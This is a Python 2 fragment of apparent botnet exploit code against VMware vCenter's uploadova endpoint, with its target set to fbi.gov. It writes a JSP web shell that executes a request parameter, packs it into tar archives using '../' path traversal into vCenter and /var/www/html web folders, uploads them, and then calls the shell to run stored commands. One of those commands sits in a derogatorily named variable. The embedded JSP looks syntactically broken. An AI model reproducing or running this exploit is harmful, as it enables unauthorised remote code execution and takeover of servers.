

        try:
            url = "https://fbi.gov"
            try:
                urllib2.urlopen(urllib2.Request(url+'/ui/vropspluginui/rest/services/uploadova', "", headers={"User-Agent" : myuseragent}))
            except urllib2.HTTPError, e:
                if e.code == 405:
                    tmpdir = (os.getenv("TEMP") if os.name=="nt" else "/tmp") + os.path.sep
                    x=open(tmpdir + "3.jsp", "w")
                    x.write("<%@ page import='java.io.Runtime' %><% try{Runtime.getRuntime().exec(request.getParameter(\"tar\"));catch(IOException e){} %>")
                    x.close()
                    tarf = tarfile.open(tmpdir + '1.tar', 'w')
                    traversal = ".." + "\\"
                    fullpath = traversal*5 + "ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\upload.jsp"
                    tarf.add(tmpdir + "3.jsp", fullpath.replace('/', '\\').replace('\\\\', '\\'))
                    tarf.close()
                    tarf = tarfile.open(tmpdir + '2.tar', 'w')
                    traversal = ".." + "/"
                    fullpath = traversal*5 + "/var/www/html/upload.jsp"
                    tarf.add(tmpdir + "3.jsp", fullpath.replace('\\', '/').replace('//', '/'))
                    tarf.close()
                    for x in [1, 2]:
                        try:
                            boundary = os.urandom(16).encode('hex')
                            f=open(tmpdir + str(x) + '.tar')
                            body = "--%s\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"upload.tar\"\r\n\r\n%s\r\n--%s--\r\n" % (boundary, f.read(), boundary)
                            f.close()
                            urllib2.urlopen(urllib2.Request(url+'/ui/vropspluginui/rest/services/uploadova', body, headers={"User-Agent" : myuseragent, "Content-Type" : "multipart/form-data; boundary=" + boundary, "Accept-Encoding" : "gzip, deflate"}))
                        except:
                            pass
                        try:
                            if x == 1:
                                urllib2.urlopen(urllib2.Request(url+'/upload.jsp?tar=' + "cmd /C " + winbox))
                            else:
                                urllib2.urlopen(urllib2.Request(url+'/upload.jsp?tar=' + stupidnigeria))
                        except:
                            pass
        except:
            pass
